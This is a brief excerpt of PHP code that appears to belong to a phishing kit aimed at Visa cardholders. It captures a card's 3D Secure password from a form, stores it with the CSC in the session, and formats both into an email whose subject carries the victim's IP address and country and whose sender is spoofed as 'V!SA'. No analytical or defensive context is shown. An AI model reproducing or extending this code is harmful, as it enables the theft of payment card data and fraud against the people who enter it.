...
$ccpass = $_SESSION['ccpass'] = $_POST['ccpass'];
...
<h2>CSC (3 digits)    : '.$_SESSION["csc"].' </h2>
<h2>3D Password       : '.$_SESSION["ccpass"].' </h2>
...
$subject  = "Crad Visa [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: V!SA" . "\r\n";
